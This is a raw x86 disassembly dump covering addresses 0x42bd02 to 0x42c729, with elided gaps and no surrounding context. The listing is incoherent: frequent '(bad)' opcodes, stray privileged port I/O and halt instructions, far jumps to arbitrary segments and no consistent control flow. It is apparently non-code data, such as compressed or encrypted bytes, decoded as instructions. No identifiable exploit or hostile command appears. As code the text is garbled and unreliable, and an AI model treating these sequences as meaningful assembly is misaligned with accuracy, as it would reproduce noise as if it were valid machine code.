  42bd02:	ficom  DWORD PTR es:[ebx-0x53]
  42bd06:	stos   BYTE PTR es:[edi],al
  42bd07:	jne    0x42bd7d
  42bd09:	jle    0x42bd59
  42bd0b:	mov    esp,0x3b97fac8
  42bd10:	sub    al,cl
  42bd12:	ja     0x42bca3
  42bd14:	inc    ebx
  42bd15:	xchg   dl,ch
  42bd17:	mov    al,ds:0x3e4a124f
  42bd1c:	and    DWORD PTR [edx+0x2e],ebp
  42bd1f:	xchg   edi,eax
  42bd20:	sub    BYTE PTR [edx-0x35593f60],bl
  42bd26:	das    
  42bd27:	fbld   TBYTE PTR [eax]
  42bd29:	ret    
  42bd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd2b:	jnp    0x42bcb5
  42bd2d:	sbb    eax,DWORD PTR [esi+0x3d432430]
  42bd33:	test   BYTE PTR [edx+0x50],bh
  42bd36:	cwde   
  42bd37:	jae    0x42bd07
  42bd39:	leave  
  42bd3a:	or     al,0x70
  42bd3c:	clc    
  42bd3d:	pusha  
  42bd3e:	inc    edi
  42bd3f:	jo     0x42bd9a
  42bd41:	popa   
  42bd42:	(bad)  
  42bd43:	or     dh,ah
  42bd45:	xor    ebp,ebx
  42bd47:	mov    ch,0x50
  42bd49:	sbb    al,0x79
  42bd4b:	repnz inc ebx
  42bd4d:	pop    edi
  42bd4e:	pop    eax
  42bd4f:	dec    ebp
  42bd50:	push   0x5d71f248
  42bd55:	push   eax
  42bd56:	sbb    ah,BYTE PTR [ebx+0x34d3c77c]
  42bd5c:	inc    edx
  42bd5d:	shl    DWORD PTR ds:0x63592b70,cl
  42bd63:	adc    BYTE PTR [ebx+0x62],ah
  42bd66:	lods   eax,DWORD PTR ds:[esi]
  42bd67:	adc    ebp,DWORD PTR [ebx]
  42bd69:	jo     0x42bd9d
  42bd6b:	pop    esp
  42bd6c:	xchg   edx,eax
  42bd6d:	inc    DWORD PTR [eax]
	...
  42bdd3:	add    BYTE PTR [eax],al
  42bdd5:	add    BYTE PTR [eax-0x61eb634a],dh
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bdb7
  42bde3:	dec    esi
  42bde4:	aad    0x98
  42bde6:	addr16 (bad) 
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	or     BYTE PTR [ebx+ebx*1+0x31],ch
  42bdf2:	or     eax,0x97ad307f
  42bdf7:	xchg   edx,eax
  42bdf8:	out    dx,eax
  42bdf9:	xchg   ecx,eax
  42bdfa:	(bad)
  42bdfd:	sahf   
  42bdfe:	push   esi
  42bdff:	and    eax,0x2e4557af
  42be04:	call   0x5ec2:0x38b91135
  42be0b:	push   ebx
  42be0c:	jnp    0x42be6e
  42be0e:	ud0    edx,ecx
  42be11:	fmul   st,st(1)
  42be13:	(bad)  
  42be14:	clc    
  42be15:	sub    DWORD PTR [edx+0x761d2222],ecx
  42be1b:	add    BYTE PTR [edi],0x75
  42be1e:	loopne 0x42be77
  42be20:	hlt    
  42be21:	pop    esi
  42be22:	mov    ds:0xce20de9b,al
  42be27:	mov    esp,ecx
  42be29:	pop    ecx
  42be2a:	sbb    bh,0x5d
  42be2d:	mov    ds:0xd23c5edb,eax
  42be32:	loopne 0x42be2a
  42be34:	loopne 0x42bdf7
  42be36:	xor    DWORD PTR [ecx+0x66ccc8b],0xb66e4d56
  42be40:	mov    edi,0x2a12a6ba
  42be45:	scas   al,BYTE PTR es:[edi]
  42be46:	or     BYTE PTR [ebx+0x66],0x4f
  42be4a:	scas   al,BYTE PTR es:[edi]
  42be4b:	pop    es
  42be4c:	and    al,0x2b
  42be4e:	add    BYTE PTR [esp+ebp*1-0x15eae5e9],ah
  42be55:	sar    DWORD PTR [eax],0x1a
  42be58:	sbb    BYTE PTR [ecx-0xd],dl
  42be5b:	mov    bl,0x75
  42be5d:	cmc    
  42be5e:	push   0x72787aa0
  42be63:	adc    BYTE PTR [edi-0x7786f19a],ah
  42be69:	push   0x756146f8
  42be6e:	pop    esi
  42be6f:	push   0xffffffc2
  42be71:	cmp    al,0x2a
  42be73:	mov    WORD PTR [edx-0x24],?
  42be76:	fcomip st,st(5)
  42be78:	mov    ds:0x5124e69d,eax
  42be7d:	pop    es
  42be7e:	cld    
  42be7f:	enter  0xf133,0x84
  42be83:	es xchg edx,eax
  42be85:	push   ecx
  42be86:	mov    ebp,DWORD PTR [edi+0x10]
  42be89:	xchg   ecx,eax
  42be8a:	ss add al,0x2b
  42be8d:	fwait
  42be8e:	jle    0x42be55
  42be90:	or     DWORD PTR [edi+0x6d12c242],edi
  42be96:	out    dx,eax
  42be97:	dec    ecx
  42be98:	mov    DWORD PTR [esi],ecx
  42be9a:	or     bh,0xa
  42be9d:	stc    
  42be9e:	fs leave 
  42bea0:	xchg   edx,eax
  42bea1:	imul   esp,DWORD PTR [eax],0x4e8a8cec
  42bea7:	imul   ebx,DWORD PTR [ecx+0x71843242],0x948bf2fe
  42beb1:	add    al,0xb8
  42beb3:	or     ch,BYTE PTR [esi+0x5688fd49]
  42beb9:	outs   dx,BYTE PTR ds:[esi]
  42beba:	push   ebp
  42bebb:	xchg   esp,eax
  42bebc:	cmc    
  42bebd:	outs   dx,BYTE PTR ds:[esi]
  42bebe:	pop    edx
  42bebf:	stos   DWORD PTR es:[edi],eax
  42bec0:	daa    
  42bec1:	lods   al,BYTE PTR ds:[esi]
  42bec2:	sbb    ah,cl
  42bec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bec5:	adc    BYTE PTR [esi+0x15],dl
  42bec8:	fisttp DWORD PTR [esi]
  42beca:	inc    esi
  42becb:	test   cl,ah
  42becd:	push   0xffffffc9
  42becf:	out    0xb,al
  42bed1:	xlat   BYTE PTR ds:[ebx]
  42bed2:	jno    0x42bea3
  42bed4:	adc    DWORD PTR [ebx],0x21e4b13d
  42beda:	dec    ebp
  42bedb:	cs popa 
  42bedd:	xchg   ebp,eax
  42bede:	mov    eax,ds:0x36cb9fb
  42bee3:	cld    
  42bee4:	(bad)  
  42bee5:	adc    eax,DWORD PTR [ebp+0xad4aa2c]
  42beeb:	jb     0x42bea4
  42beed:	hlt    
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0xbe7bd7c8,eax
  42bf63:	cdq    
  42bf64:	sbb    ah,BYTE PTR [ebp+0x1d767]
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	sub    dl,ah
  42bf70:	mov    bl,0xa6
  42bf72:	or     al,0xa6
  42bf74:	out    0xa9,eax
  42bf76:	stos   DWORD PTR es:[edi],eax
  42bf77:	add    edi,DWORD PTR [eax-0x29c8e95c]
  42bf7d:	mov    cl,0x7b
  42bf7f:	pop    edi
  42bf80:	cmp    al,0x1a
  42bf82:	mov    WORD PTR ds:0xfca273c7,?
  42bf88:	(bad)  
  42bf89:	sbb    BYTE PTR [ecx],cl
  42bf8b:	(bad)  
  42bf8c:	aaa    
  42bf8d:	imul   ecx,DWORD PTR [edi-0x612cb388],0xfc21f97e
  42bf97:	out    dx,eax
  42bf98:	adc    BYTE PTR [ebx],dl
  42bf9a:	js     0x42bf43
  42bf9c:	ins    BYTE PTR es:[edi],dx
  42bf9d:	popf   
  42bf9e:	fs sbb dh,dl
  42bfa1:	cwde   
  42bfa2:	test   DWORD PTR [esi],ebx
  42bfa4:	or     ah,bl
  42bfa6:	sub    BYTE PTR [eax+0x3e],dh
  42bfa9:	jnp    0x42bf69
  42bfab:	je     0x42bf6f
  42bfad:	lahf   
  42bfae:	push   es
  42bfaf:	jle    0x42bfd0
  42bfb1:	ss sahf 
  42bfb3:	cmp    eax,0x95bad5f2
  42bfb8:	cdq    
  42bfb9:	fisttp DWORD PTR [edx-0x423b6ad0]
  42bfbf:	ja     0x42c00e
  42bfc1:	and    esp,DWORD PTR [ecx+0x5dbe7483]
  42bfc7:	jmp    0xdace:0x5c2a3fa4
  42bfce:	fadd   QWORD PTR ds:0xbef67e24
  42bfd4:	jo     0x42c027
  42bfd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfd7:	addr16 mov ebp,0xc70bea66
  42bfdd:	out    dx,al
  42bfde:	lds    eax,FWORD PTR [ebp-0x25]
  42bfe1:	cmp    DWORD PTR [eax+eax*1+0x58],edi
  42bfe5:	pop    ebp
  42bfe6:	or     al,0xa6
  42bfe8:	or     BYTE PTR [ecx],bl
  42bfea:	sbb    esp,DWORD PTR [esi]
  42bfec:	mov    DWORD PTR [ebx+esi*8-0x1930518e],eax
  42bff3:	push   esp
  42bff4:	and    DWORD PTR [edi-0x1f],0x42046aba
  42bffb:	adc    eax,0x91bd8784
  42c000:	push   0x3d2b83ed
  42c005:	(bad)  
  42c006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c007:	icebp  
  42c008:	hlt    
  42c009:	sub    edi,DWORD PTR [ebx+0x38]
  42c00c:	out    dx,eax
  42c00d:	jb     0x42c049
  42c00f:	mov    edx,0x35d0cd4d
  42c014:	adc    eax,0xe4b8918d
  42c019:	(bad)  
  42c01a:	cmp    BYTE PTR [edx+ebx*4],ah
  42c01d:	lahf   
  42c01e:	sahf   
  42c01f:	mov    bl,0xeb
  42c021:	arpl   WORD PTR [esi-0x6],di
  42c024:	fxch   st(6)
  42c026:	sub    ebx,DWORD PTR [eax+ecx*1+0x61]
  42c02a:	cmp    DWORD PTR [esi-0x3e18b538],eax
  42c030:	ficomp DWORD PTR [ebx+0x1f383250]
  42c036:	retf   
  42c037:	loopne 0x42c031
  42c039:	ja     0x42bff9
  42c03b:	pushf  
  42c03c:	ss mov eax,0x8db3e228
  42c042:	mov    esi,0x607a821d
  42c047:	lds    edi,FWORD PTR [ecx+0x1602b072]
  42c04d:	js     0x42bfd6
  42c04f:	mov    ch,0xa
  42c051:	outs   dx,BYTE PTR ds:[esi]
  42c052:	sub    BYTE PTR [ebx],cl
  42c054:	ins    DWORD PTR es:[edi],dx
  42c055:	mov    ebx,0xa2287a89
  42c05a:	sbb    dl,BYTE PTR [ebx]
  42c05c:	pop    eax
  42c05d:	repnz test DWORD PTR [ecx-0x34043cbd],0x4643d3a3
  42c068:	scas   al,BYTE PTR es:[edi]
  42c069:	daa    
  42c06a:	push   es
  42c06b:	fwait
  42c06c:	inc    edx
  42c06d:	ins    DWORD PTR es:[edi],dx
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	mov    al,ds:0x67f8e198
  42c0e7:	fadd   DWORD PTR [ecx]
  42c0e9:	add    BYTE PTR [eax],al
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [edx],al
  42c0ef:	xor    ecx,DWORD PTR [eax+0x6c47f14]
  42c0f5:	dec    edx
  42c0f6:	and    BYTE PTR [edi+eiz*2],ch
  42c0f9:	ja     0x42c0bd
  42c0fb:	push   ebx
  42c0fc:	out    0xb4,al
  42c0fe:	(bad)  
  42c0ff:	mov    bh,0xba
  42c101:	adc    dh,0x49
  42c104:	cli    
  42c105:	(bad)  
  42c106:	and    ebp,DWORD PTR [esi+0x11]
  42c109:	leave  
  42c10a:	add    al,0x85
  42c10c:	add    al,BYTE PTR [eax+0x7e598a4a]
  42c112:	popf   
  42c113:	psrlq  mm7,mm5
  42c116:	sub    eax,0xc36e0ec1
  42c11b:	js     0x42c12e
  42c11d:	lods   eax,DWORD PTR ds:[esi]
  42c11e:	mov    al,ds:0x122d0d64
  42c123:	jecxz  0x42c0da
  42c125:	xchg   edi,eax
  42c126:	push   es
  42c127:	mov    ah,0x94
  42c129:	loopne 0x42c0ca
  42c12b:	mov    ds:0x695c614e,al
  42c130:	fwait
  42c131:	ret    0x7837
  42c134:	retf   0x360f
  42c137:	mov    ecx,0xc97f3686
  42c13c:	and    BYTE PTR [edx-0xc71a65c],cl
  42c142:	cmp    eax,0x5d05fd10
  42c147:	retf   
  42c148:	dec    eax
  42c149:	xor    esi,DWORD PTR [eax+0x251899c6]
  42c14f:	jp     0x42c0e0
  42c151:	clc    
  42c152:	fs ss out 0x19,al
  42c156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c157:	(bad)  
  42c158:	in     al,dx
  42c159:	cwde   
  42c15a:	dec    esi
  42c15b:	pop    es
  42c15c:	stos   DWORD PTR es:[edi],eax
  42c15d:	push   0xffffff8a
  42c15f:	loope  0x42c164
  42c161:	sub    bh,dh
  42c163:	cmp    al,0x71
  42c165:	shl    BYTE PTR [ebx],0xad
  42c168:	lock push ss
  42c16a:	sub    al,0x52
  42c16c:	lods   eax,DWORD PTR ds:[esi]
  42c16d:	jmp    0x3da7:0xe43126a7
  42c174:	div    DWORD PTR cs:[esi]
  42c177:	into   
  42c178:	pushf  
  42c179:	sbb    BYTE PTR [ebx-0x287a7db0],bh
  42c17f:	jne    0x42c149
  42c181:	cmp    ebp,esp
  42c183:	pushaw 
  42c185:	adc    DWORD PTR [ecx+0x52],0x3c
  42c189:	das    
  42c18a:	repz enter 0x643b,0x4a
  42c18f:	xor    ah,BYTE PTR [esi-0x5970bc27]
  42c195:	push   ebp
  42c196:	sub    esp,DWORD PTR [edi]
  42c198:	enter  0xadba,0x44
  42c19c:	test   BYTE PTR [esp],bl
  42c19f:	lock aad 0xe1
  42c1a2:	add    eax,0xe4b8302e
  42c1a7:	mov    edx,DWORD PTR [esp+ecx*1]
  42c1aa:	jecxz  0x42c225
  42c1ac:	pushf  
  42c1ad:	out    0xdb,eax
  42c1af:	ror    DWORD PTR [eax+ecx*1-0x4adcb888],1
  42c1b6:	push   ss
  42c1b7:	pushf  
  42c1b8:	jae    0x42c1f8
  42c1ba:	push   esp
  42c1bb:	div    dh
  42c1bd:	inc    ebp
  42c1be:	repnz sub esp,edi
  42c1c1:	scas   al,BYTE PTR es:[edi]
  42c1c2:	cmp    ebp,DWORD PTR [esi]
  42c1c4:	inc    ebp
  42c1c5:	mov    dl,0x31
  42c1c7:	js     0x42c15c
  42c1c9:	sar    BYTE PTR [ebp-0x2c335972],cl
  42c1cf:	fild   QWORD PTR [esi+ebp*4+0x5]
  42c1d3:	inc    ecx
  42c1d4:	ret    0x710a
  42c1d7:	pslld  mm2,mm5
  42c1da:	shr    DWORD PTR [eax-0x6e],0x31
  42c1de:	test   cl,cl
  42c1e0:	hlt    
  42c1e1:	mov    esi,0xa8440124
  42c1e6:	mov    eax,0xc77ce8c
  42c1eb:	jne    0x42c1aa
  42c1ed:	out    dx,eax
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	fwait
  42c263:	sbb    al,0x57
  42c265:	inc    esi
  42c266:	fld    DWORD PTR [bx+di]
  42c269:	add    BYTE PTR [eax],al
  42c26b:	add    DWORD PTR [eax],eax
  42c26d:	add    BYTE PTR [eax-0x2ab4aed1],ch
  42c273:	dec    eax
  42c274:	xor    DWORD PTR [esi],ecx
  42c276:	dec    ebx
  42c277:	out    dx,eax
  42c278:	or     al,0xd2
  42c27a:	and    ch,BYTE PTR [ebx+0x7450fdd3]
  42c280:	ret    
  42c281:	sub    al,0x8f
  42c283:	stos   BYTE PTR es:[edi],al
  42c284:	frstor [eax]
  42c286:	cmp    esi,ebp
  42c288:	jle    0x42c2d7
  42c28a:	aad    0xbc
  42c28c:	hlt    
  42c28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c28e:	push   ds
  42c28f:	pop    ebp
  42c290:	inc    ebx
  42c291:	jmp    0x7e843ec3
  42c296:	sbb    edx,edx
  42c298:	push   ecx
  42c299:	mov    cl,0xa4
  42c29b:	scas   al,BYTE PTR es:[edi]
  42c29c:	fild   DWORD PTR [ecx+0x6a]
  42c29f:	cwde   
  42c2a0:	mov    DWORD PTR [esi-0x5b],esp
  42c2a3:	mov    bh,0x59
  42c2a5:	cld    
  42c2a6:	pop    esi
  42c2a7:	ror    esi,cl
  42c2a9:	mov    dh,0x47
  42c2ab:	test   al,0x4
  42c2ad:	inc    ebx
  42c2ae:	jmp    0x42c23d
  42c2b0:	jns    0x42c242
  42c2b2:	jmp    0x7714:0x83703633
  42c2b9:	cmc    
  42c2ba:	dec    eax
  42c2bb:	mov    ecx,0x9c49b4e5
  42c2c0:	je     0x42c2c2
  42c2c2:	(bad)  
  42c2c3:	addr16 std 
  42c2c5:	jmp    0x79a13e33
  42c2ca:	daa    
  42c2cb:	test   bh,cl
  42c2cd:	cmp    dh,BYTE PTR [esi]
  42c2cf:	pop    esi
  42c2d0:	add    ecx,DWORD PTR ds:[edx+0x49534c1e]
  42c2d7:	or     esp,DWORD PTR [edx+0x50e161da]
  42c2dd:	push   edx
  42c2de:	jno    0x42c300
  42c2e0:	or     DWORD PTR [eax-0x3],esi
  42c2e3:	pop    edi
  42c2e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c2e5:	pop    es
  42c2e6:	add    bl,BYTE PTR [eax+0x5d77d20b]
  42c2ec:	in     al,0x10
  42c2ee:	daa    
  42c2ef:	iret   
  42c2f0:	daa    
  42c2f1:	mov    edx,0x4097e4d6
  42c2f6:	std    
  42c2f7:	hlt    
  42c2f8:	mov    ch,0xfd
  42c2fa:	test   al,0x22
  42c2fc:	jecxz  0x42c337
  42c2fe:	and    ebp,DWORD PTR [ebx+ecx*8]
  42c301:	imul   esp,DWORD PTR [ebx],0xffffff8e
  42c304:	add    DWORD PTR [eax-0x29],ecx
  42c307:	or     DWORD PTR [ebx],ebx
  42c309:	fsub   QWORD PTR [ecx+ecx*8-0xe]
  42c30d:	pop    es
  42c30e:	lods   al,BYTE PTR ds:[esi]
  42c30f:	fst    DWORD PTR [edi+0x33027e87]
  42c315:	adc    al,0x26
  42c317:	adc    bh,BYTE PTR [ecx+ebp*4-0x446fc6bd]
  42c31e:	add    eax,0x250319ae
  42c323:	sub    bh,0xba
  42c326:	fwait
  42c327:	sar    BYTE PTR [edx-0x58],cl
  42c32a:	test   eax,0x1975429b
  42c32f:	out    0x6c,al
  42c331:	popf   
  42c332:	fs jmp 0x9ee375d2
  42c338:	mov    ecx,0x72eb59da
  42c33d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c33e:	mov    ebp,0x53521fd8
  42c343:	ret    
  42c344:	jne    0x42c336
  42c346:	push   cs
  42c347:	loop   0x42c32b
  42c349:	add    eax,0x4138526c
  42c34e:	xchg   BYTE PTR [edi+0x6f],ch
  42c351:	out    dx,eax
  42c352:	push   eax
  42c353:	sbb    al,0x3b
  42c355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c356:	mov    ecx,0x12e6b2d6
  42c35b:	jmp    0x5fde:0xcfd5b996
  42c362:	int    0x82
  42c364:	les    ebp,FWORD PTR [edi]
  42c366:	in     al,0x61
  42c368:	int    0xd9
  42c36a:	xchg   DWORD PTR ds:[edi],edx
  42c36d:	lods   eax,DWORD PTR ds:[esi]
	...
  42c3d6:	out    0xf,al
  42c3d8:	fldcw  WORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x469ecf6
  42c3e5:	add    eax,0x1da67
  42c3ea:	add    BYTE PTR [ecx],al
  42c3ec:	add    BYTE PTR [eax],al
  42c3ee:	adc    DWORD PTR [ecx+eiz*8-0x6e],ecx
  42c3f2:	push   ds
  42c3f3:	mov    ebp,DWORD PTR [ecx-0x647cc3b4]
  42c3f9:	fcom   DWORD PTR [eax+0xe4a93fb]
  42c3ff:	pop    ebx
  42c400:	fild   WORD PTR [esi]
  42c402:	sbb    ecx,DWORD PTR [edi+ebx*2-0x2c]
  42c406:	shl    edx,0x73
  42c409:	shl    BYTE PTR [ecx-0x13],1
  42c40c:	pop    eax
  42c40d:	test   al,0x5d
  42c40f:	in     al,0x80
  42c411:	sbb    al,BYTE PTR [eax-0x577e458c]
  42c417:	int3   
  42c418:	in     al,dx
  42c419:	loopne 0x42c3a4
  42c41b:	and    DWORD PTR ds:0x15a7253b,ebp
  42c421:	dec    ebp
  42c422:	cmp    eax,0xcf1f8149
  42c427:	(bad)  
  42c428:	dec    edx
  42c429:	jl     0x42c47c
  42c42b:	iret   
  42c42c:	dec    ebp
  42c42d:	add    eax,0xe7e0ea97
  42c432:	adc    dh,BYTE PTR [ebx]
  42c434:	fidivr WORD PTR [esi+0x5]
  42c437:	or     DWORD PTR [edx],ebp
  42c439:	ins    BYTE PTR es:[edi],dx
  42c43a:	lods   al,BYTE PTR ds:[esi]
  42c43b:	jns    0x42c43c
  42c43d:	xchg   edx,eax
  42c43e:	fsub   QWORD PTR [edi+0x7ad0c2ee]
  42c444:	lock jge 0x42c463
  42c447:	gs pop ecx
  42c449:	sub    DWORD PTR [ebp+edi*8-0x57],ecx
  42c44d:	inc    esp
  42c44e:	or     BYTE PTR [ebx-0x23741801],0x13
  42c455:	ret    
  42c456:	xor    ebx,DWORD PTR [ebp-0x33ddd3d9]
  42c45c:	dec    esp
  42c45d:	std    
  42c45e:	fwait
  42c45f:	in     eax,dx
  42c460:	mov    ah,dh
  42c462:	jo     0x42c441
  42c464:	lds    ebp,FWORD PTR [eax+0x5a]
  42c467:	jle    0x42c490
  42c469:	mov    esi,DWORD PTR [ebp-0x3a6a04d7]
  42c46f:	pop    es
  42c470:	xlat   BYTE PTR ds:[ebx]
  42c471:	mov    esp,0x816ca6ea
  42c476:	addr16 sti 
  42c478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c479:	dec    esp
  42c47a:	sbb    al,0x32
  42c47c:	lock mov esp,ecx
  42c47f:	inc    esi
  42c480:	aad    0x96
  42c482:	add    BYTE PTR [ecx],ch
  42c484:	(bad)  [ecx+0x7c]
  42c487:	fistp  QWORD PTR [esi]
  42c489:	popa   
  42c48a:	push   0x63
  42c48c:	jbe    0x42c4d6
  42c48e:	inc    eax
  42c48f:	mov    dl,0x79
  42c491:	push   esp
  42c492:	or     eax,0x2176aa58
  42c497:	stos   DWORD PTR es:[edi],eax
  42c498:	or     BYTE PTR [edi+edx*2-0x4c],dl
  42c49c:	cdq    
  42c49d:	push   edi
  42c49e:	mov    ds:0x7092da43,eax
  42c4a3:	imul   esp,DWORD PTR [edx+0x761585dc],0x79
  42c4aa:	cmp    DWORD PTR [bp+si],ebx
  42c4ad:	jnp    0x42c4ee
  42c4af:	and    dl,dl
  42c4b1:	mov    bh,BYTE PTR [eax+0x6ef6e2b5]
  42c4b7:	inc    esi
  42c4b8:	idiv   DWORD PTR [eax]
  42c4ba:	push   edx
  42c4bb:	inc    ebp
  42c4bc:	xor    ebp,esp
  42c4be:	test   DWORD PTR [edi+0x79],esp
  42c4c1:	and    DWORD PTR [ecx],0xffffffd1
  42c4c4:	inc    ecx
  42c4c5:	jns    0x42c4d2
  42c4c7:	not    ebp
  42c4c9:	mov    al,ds:0x1868351b
  42c4ce:	or     DWORD PTR [eax+0x205375d8],ecx
  42c4d4:	dec    ebp
  42c4d5:	imul   eax,eax,0xffffffe0
  42c4d8:	and    DWORD PTR [edi],ecx
  42c4da:	mov    al,0x5b
  42c4dc:	(bad)  
  42c4dd:	xor    DWORD PTR [edx],ebx
  42c4df:	inc    esi
  42c4e0:	lods   eax,DWORD PTR ds:[esi]
  42c4e1:	jmp    0x42c53f
  42c4e3:	jmp    0x4ed83045
  42c4e8:	cli    
  42c4e9:	pop    esp
  42c4ea:	ja     0x42c548
  42c4ec:	push   edi
  42c4ed:	or     al,0x0
	...
  42c553:	add    BYTE PTR [eax],al
  42c555:	add    ah,ch
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0xff34,0x24
  42c564:	push   edi
  42c565:	pop    eax
  42c566:	fild   DWORD PTR [bx+di]
  42c569:	add    BYTE PTR [eax],al
  42c56b:	add    DWORD PTR [eax],eax
  42c56d:	add    BYTE PTR [ecx+0x3d],al
  42c570:	pop    ebx
  42c571:	bound  eax,QWORD PTR [ecx+0x94d12aa]
  42c577:	adc    DWORD PTR [edx-0x65],ebx
  42c57a:	in     al,0x13
  42c57c:	ja     0x42c5a7
  42c57e:	pop    es
  42c57f:	sbb    al,0x6c
  42c581:	jg     0x42c534
  42c583:	or     BYTE PTR [ecx+0x41896cc],ah
  42c589:	outs   dx,DWORD PTR ds:[esi]
  42c58a:	pop    ebx
  42c58b:	sub    BYTE PTR [esi],0xba
  42c58e:	or     DWORD PTR [ebx-0x7d],esi
  42c591:	jmp    0x42c577
  42c593:	punpcklbw mm6,DWORD PTR [edi+0x18]
  42c597:	or     DWORD PTR [edi],ebp
  42c599:	pop    ebx
  42c59a:	out    0xce,eax
  42c59c:	std    
  42c59d:	push   eax
  42c59e:	lock dec edx
  42c5a0:	xor    al,0xaf
  42c5a2:	or     eax,0xdd1e12a0
  42c5a7:	ret    0x360c
  42c5aa:	inc    eax
  42c5ab:	mov    esp,0x7a80da37
  42c5b0:	ins    BYTE PTR es:[edi],dx
  42c5b1:	pop    esp
  42c5b2:	mov    esi,0xcf557267
  42c5b7:	jno    0x42c546
  42c5b9:	dec    ecx
  42c5ba:	inc    edx
  42c5bb:	xchg   cl,bh
  42c5bd:	mov    edi,0x1c0208f5
  42c5c2:	inc    esp
  42c5c3:	sbb    ebp,esi
  42c5c5:	ret    
  42c5c6:	mov    WORD PTR [edx],cs
  42c5c8:	and    eax,0x11c75616
  42c5cd:	ficomp WORD PTR [ebx]
  42c5cf:	sbb    dl,BYTE PTR [edx-0x217e26ad]
  42c5d5:	int3   
  42c5d6:	inc    esi
  42c5d7:	imul   eax,DWORD PTR [edx-0x12561904],0xb587e1b7
  42c5e1:	sub    edx,DWORD PTR [eax-0x41]
  42c5e4:	or     al,BYTE PTR [ebx+0x6cf7a0c]
  42c5ea:	popf   
  42c5eb:	lds    eax,FWORD PTR [ebx+0x1d]
  42c5ee:	sub    al,0x37
  42c5f0:	push   esp
  42c5f1:	push   ebx
  42c5f2:	and    al,0xd9
  42c5f4:	mov    eax,0xe0422ee6
  42c5f9:	push   esp
  42c5fa:	fwait
  42c5fb:	xchg   BYTE PTR [ecx-0x5ca3462f],bl
  42c601:	mov    bl,0xcf
  42c603:	sub    BYTE PTR [esp+esi*2],ch
  42c606:	sbb    al,0x81
  42c608:	out    dx,eax
  42c609:	test   edi,0x3a11ec0
  42c60f:	xchg   ecx,eax
  42c610:	pushf  
  42c611:	push   edi
  42c612:	mov    DWORD PTR [esi-0x3408d805],edi
  42c618:	xchg   ecx,eax
  42c619:	jb     0x42c695
  42c61b:	outs   dx,BYTE PTR ds:[esi]
  42c61c:	mov    ecx,0xa93faaf6
  42c621:	xchg   esp,eax
  42c622:	popf   
  42c623:	test   DWORD PTR [edi-0x4c42f261],ebp
  42c629:	imul   esi,esp,0x4969b5ef
  42c62f:	inc    eax
  42c630:	dec    edi
  42c631:	jmp    0x85fb:0xb1559e1
  42c638:	push   cs
  42c639:	fnstcw WORD PTR [ebp+0x6e]
  42c63c:	push   esp
  42c63d:	out    0x91,eax
  42c63f:	ss xchg edx,eax
  42c641:	into   
  42c642:	int3   
  42c643:	jge    0x42c635
  42c645:	or     BYTE PTR [edi+0x52],0x89
  42c649:	jecxz  0x42c658
  42c64b:	inc    esi
  42c64c:	cmp    edx,DWORD PTR [esi]
  42c64e:	(bad)  
  42c64f:	mov    ebp,0x5f888891
  42c654:	jge    0x42c6b7
  42c656:	pop    edi
  42c657:	pop    eax
  42c658:	jbe    0x42c62a
  42c65a:	jle    0x42c5f9
  42c65c:	ja     0x42c61c
  42c65e:	push   es
  42c65f:	inc    edi
  42c660:	in     al,dx
  42c661:	mov    ecx,0x7a40ae06
  42c666:	in     eax,dx
  42c667:	dec    ebp
  42c668:	mov    ebp,0xd12bb02c
  42c66d:	das    
	...
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx-0x24920395]
  42c6e3:	in     al,dx
  42c6e4:	mov    WORD PTR [esi+0x67],ss
  42c6e7:	fadd   QWORD PTR [ecx]
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    BYTE PTR [ebx],dl
  42c6ef:	jmp    0x42c736
  42c6f1:	adc    DWORD PTR [ebp-0x224b25e3],esp
  42c6f7:	and    DWORD PTR [ecx],edi
  42c6f9:	or     DWORD PTR [edi],esp
  42c6fb:	jp     0x42c743
  42c6fd:	imul   eax,DWORD PTR [ebx+0x44bbb933],0xa8d07ed8
  42c707:	fist   WORD PTR [esi]
  42c709:	add    DWORD PTR [edx-0x74],0x14
  42c70d:	fisttp DWORD PTR [edi-0x47]
  42c710:	xchg   ebp,eax
  42c711:	mov    dh,0xd6
  42c713:	pop    ecx
  42c714:	addr16 popa 
  42c716:	leave  
  42c717:	out    dx,al
  42c718:	aas    
  42c719:	add    BYTE PTR [ecx+edx*8],ch
  42c71c:	dec    ebx
  42c71d:	sub    DWORD PTR [ebx+0x5c9d41d2],edx
  42c723:	repz xor BYTE PTR [esi+0x42],dl
  42c727:	jp     0x42c7a2
  42c729:	inc    eax
